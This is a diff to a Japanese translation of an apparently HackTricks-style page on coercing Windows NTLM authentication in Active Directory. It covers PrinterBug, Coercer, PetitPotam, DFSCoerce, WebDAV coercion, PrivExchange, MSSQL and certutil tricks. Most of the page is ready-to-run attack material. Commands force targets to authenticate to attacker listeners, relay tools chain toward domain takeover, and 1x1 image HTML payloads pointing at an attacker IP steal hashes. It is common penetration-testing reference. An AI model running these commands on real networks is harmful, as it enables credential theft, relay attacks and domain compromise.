@@ -4,97 +4,129 @@
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、サードパーティの依存を避けるために MIDL コンパイラを使用して C# で実装された、**リモート認証トリガー**の**コレクション**です。
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party dependencies を避けるために MIDL compiler を使用して C# で記述された、**remote authentication triggers** の**コレクション**です。
 
 ## Spooler Service Abuse
 
-If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
-注意：プリンターが任意のシステムに通知を送る場合、そのシステムに対して**認証**する必要があります。したがって、攻撃者は _**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、サービスはその認証で**コンピュータアカウントを使用**します。
+_**Print Spooler**_ サービスが**有効**であれば、既知の AD credentials を使って Domain Controller の print server に対し、新しい print jobs の**更新を要求**し、その通知をある system に送るように指示できます。\
+printer が任意の system に通知を送信するとき、その **system に対して authentication** する必要がある点に注意してください。したがって、攻撃者は _**Print Spooler**_ サービスに任意の system へ authentication させることができ、その際サービスはこの authentication に **computer account** を使用します。
 
-### Finding Windows Servers on the domain
+内部的には、古典的な **PrinterBug** primitive は **`\\PIPE\\spoolss`** 上の **`RpcRemoteFindFirstPrinterChangeNotificationEx`** を悪用します。攻撃者はまず printer/server handle を開き、次に `pszLocalMachine` に偽の client name を渡すことで、target spooler に **attacker-controlled host** へ戻る notification channel を作成させます。これが、効果が direct code execution ではなく **outbound authentication coercion** である理由です。\
+spooler 自体で **RCE/LPE** を探している場合は、[PrintNightmare](printnightmare.md) を確認してください。このページは **coercion と relay** に焦点を当てています。
 
-Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
+### ドメイン上の Windows Servers を見つける
+
+PowerShell を使って、Windows boxes の一覧を取得します。Servers は通常優先度が高いので、そこに注目しましょう:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Spooler サービスがリッスンしているかの検出
+### Spooler services listening の確認
 
-少し修正した @mysmartlogin の (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を使用して、Spooler Service がリッスンしているか確認します：
+少し変更した @mysmartlogin's (Vincent Le Toux's) の [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を使用して、Spooler Service が待ち受けているか確認します:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-Linux上でrpcdump.pyを使ってMS-RPRN Protocolを確認することもできます。
+Linux上でも`rpcdump.py`を使用して、**MS-RPRN**プロトコルを探すこともできます：
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
+Linuxから **NetExec/CrackMapExec** を使ってホストを素早くテストするには:
+```bash
+nxc smb targets.txt -u user -p password -M spooler
+```
+スプーラーのエンドポイントが存在するかどうかを確認するだけでなく、**coercion surfaces** を列挙したい場合は、**Coercer scan mode** を使用します:
+```bash
+coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
+coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
+```
+これは有用です。というのも、EPMでエンドポイントを確認できても、そのprint RPC interfaceが登録されていることが分かるだけだからです。それは、**現在の権限であらゆる coercion method に到達できること**や、ホストが利用可能な認証フローを送出することを保証しません。
+
 ### サービスに任意のホストへの認証を要求する
 
-ここから [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket) をコンパイルできます。
+[SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket) をコンパイルできます。
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-または、Linux を使用している場合は [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) または [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) を使用してください
+または、Linux を使っている場合は [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) または [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) を使用できます
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Unconstrained Delegation と組み合わせた場合
+**Coercer** を使うと、spooler インターフェースを直接狙え、どの RPC method が公開されているかを推測する必要を避けられます:
+```bash
+coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
+coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
+```
+### WebClientでSMBの代わりにHTTPを強制する
 
-If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
+Classic PrinterBug は通常、`\\attacker\share` への **SMB** 認証を発生させます。これは **capture**、**HTTP targets** への relay、または **SMB signing** がない場合の relay にまだ有用です。\
+しかし、現代の環境では、**SMB to SMB** の relay は **SMB signing** によってしばしばブロックされるため、運用者は代わりに **HTTP/WebDAV** 認証を強制することをよく選びます。
 
-## RPC の強制認証
+ターゲットで **WebClient** サービスが動作している場合、listener は Windows に **HTTP 上の WebDAV** を使わせる形式で指定できます:
+```bash
+printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
+coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
+```
+これは、**`ntlmrelayx --adcs`** や他の HTTP relay target と連鎖させる場合に特に有用です。というのも、強制された接続で SMB relayability に依存しなくて済むからです。重要な注意点は、HTTP/WebDAV 版を機能させるには、被害者上で **WebClient が実行中** である必要があることです。
+
+### Unconstrained Delegation と組み合わせる
+
+攻撃者がすでに [Unconstrained Delegation](unconstrained-delegation.md) を持つコンピュータを侵害している場合、攻撃者は**プリンタにこのコンピュータへ認証させる**ことができます。Unconstrained Delegation により、プリンタの **computer account** の **TGT** は、Unconstrained Delegation のあるコンピュータの **memory** に**保存**されます。攻撃者はすでにこのホストを侵害しているため、この ticket を**取得**して悪用できます（[Pass the Ticket](pass-the-ticket.md)）。
+
+## RPC 強制認証
 
 [Coercer](https://github.com/p0dalirius/Coercer)
 
-### RPC UNC-path coercion マトリックス（アウトバウンド認証をトリガーする interfaces/opnums）
+### RPC UNC-path coercion matrix (外向き認証をトリガーする interfaces/opnums)
 - MS-RPRN (Print System Remote Protocol)
-- パイプ: \\PIPE\\spoolss
+- Pipe: \\PIPE\\spoolss
 - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
 - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
-- ツール: PrinterBug / PrintNightmare-family
+- Tools: PrinterBug / SpoolSample / Coercer
 - MS-PAR (Print System Asynchronous Remote)
-- パイプ: \\PIPE\\spoolss
+- Pipe: \\PIPE\\spoolss
 - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
-- Opnum: 0 RpcAsyncOpenPrinter
+- Notes: 同じ spooler pipe 上の非同期 print interface。Coercer を使って、指定したホストで到達可能な method を列挙する
 - MS-EFSR (Encrypting File System Remote Protocol)
-- パイプ: \\PIPE\\efsrpc (\\PIPE\\lsarpc、\\PIPE\\samr、\\PIPE\\lsass、\\PIPE\\netlogon 経由でも)
+- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
 - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
 - Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
-- ツール: PetitPotam
+- Tool: PetitPotam
 - MS-DFSNM (DFS Namespace Management)
-- パイプ: \\PIPE\\netdfs
+- Pipe: \\PIPE\\netdfs
 - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
 - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
-- ツール: DFSCoerce
+- Tool: DFSCoerce
 - MS-FSRVP (File Server Remote VSS)
-- パイプ: \\PIPE\\FssagentRpc
+- Pipe: \\PIPE\\FssagentRpc
 - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
 - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
-- ツール: ShadowCoerce
+- Tool: ShadowCoerce
 - MS-EVEN (EventLog Remoting)
-- パイプ: \\PIPE\\even
+- Pipe: \\PIPE\\even
 - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
 - Opnum: 9 ElfrOpenBELW
-- ツール: CheeseOunce
+- Tool: CheeseOunce
 
-Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.
+Note: これらの method は UNC path を運べる parameter を受け付けます（例: `\\attacker\share`）。処理されると、Windows はその UNC に対して認証（machine/user context）し、NetNTLM の capture または relay を可能にします。\
+spooler abuse では、**MS-RPRN opnum 65** が依然として最も一般的で、最も文書化された primitive です。というのも、protocol specification には、server が `pszLocalMachine` で指定された client へ通知 channel を作成すると明記されているからです。
 
-### MS-EVEN: ElfrOpenBELW (opnum 9) の強制
-- インターフェイス: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
-- 呼び出しシグネチャ: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
-- 効果: 対象は指定されたバックアップログパスを開こうとし、攻撃者が管理する UNC に対して認証します。
-- 実用例: Tier 0 資産 (DC/RODC/Citrix/etc.) を強制して NetNTLM を送出させ、それを AD CS エンドポイント (ESC8/ESC11 シナリオ) や他の特権サービスにリレーする。
+### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
+- Interface: \\PIPE\\even 上の MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
+- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
+- Effect: target は与えられた backup log path を開こうとし、attacker-controlled UNC に認証します。
+- Practical use: Tier 0 assets (DC/RODC/Citrix/etc.) を強制して NetNTLM を送信させ、その後 AD CS endpoints (ESC8/ESC11 scenarios) や他の privileged services へ relay する。
 
 ## PrivExchange
 
-The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.
+`PrivExchange` attack は、**Exchange Server `PushSubscription` feature** に見つかった flaw の結果です。この feature により、mailbox を持つ任意の domain user は、Exchange server に対して client-provided host へ HTTP 経由で認証させることができます。
 
-By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.
+既定では、**Exchange service は SYSTEM として実行**され、過剰な privileges が付与されています（具体的には、**pre-2019 Cumulative Update の domain では WriteDacl privileges** を持ちます）。この flaw は、**LDAP への relaying** を有効にし、その後 **domain NTDS database** を抽出するために悪用できます。LDAP への relaying が不可能な場合でも、この flaw は domain 内の他の host への relay と認証に引き続き使用できます。この attack の成功により、認証済みの任意の domain user account から即座に Domain Admin へアクセスできます。
 
 ## Windows 内部
 
-If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:
+すでに Windows machine の内部にいる場合は、次の方法で privileged accounts を使って Windows に server へ接続させることができます:
 
 ### Defender MpCmdRun
 ```bash
@@ -115,46 +147,48 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-別の手法としてこちらを使う: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+または、別のテクニックを使います: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-certutil.exe lolbin (Microsoft-signed binary) を使って NTLM 認証を強制することが可能です:
+certutil.exe lolbin (Microsoft-signed binary) を使って NTLM authentication を強制することが可能です:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
-## HTML injection
+## HTMLインジェクション
 
-### メール経由
+### email 経由
 
-もしあなたが侵害したいマシンにログインするユーザーの**email address**を知っているなら、次のような**email with a 1x1 image**を送るだけで済みます
+侵害したいマシンにログインする user の **email address** がわかっているなら、たとえば次のような **1x1 image を含む email** をその user に送るだけでよいです
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-対象がそれを開くと、認証を試みます。
+そして彼がそれを開くと、認証しようとします。
 
 ### MitM
 
-もしコンピュータに対してMitM攻撃を行い、対象が閲覧するページにHTMLを注入できるなら、ページに次のような画像を注入してみてください：
+コンピュータに対して MitM 攻撃を実行でき、彼が表示するページに HTML を注入できるなら、次のような画像をページに注入してみることができます:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## NTLM 認証を強制・フィッシングする他の方法
+## NTLM認証を強制およびフィッシングするその他の方法
 
 
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-## NTLMv1 のクラック
+## NTLMv1をクラックする
 
-もし [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack) をキャプチャできるなら。\
-_NTLMv1 をクラックするには Responder challenge を "1122334455667788" に設定する必要があることを覚えておいてください_
+[NTLMv1チャレンジをキャプチャできるなら、ここでそのクラック方法を読む](../ntlm/index.html#ntlmv1-attack).\
+_覚えておいてください。NTLMv1をクラックするには、Responderのchallengeを "1122334455667788" に設定する必要があります_
 
 ## References
 - [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
+- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
 - [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
 - [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
+- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
 - [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
 - [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
 - [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
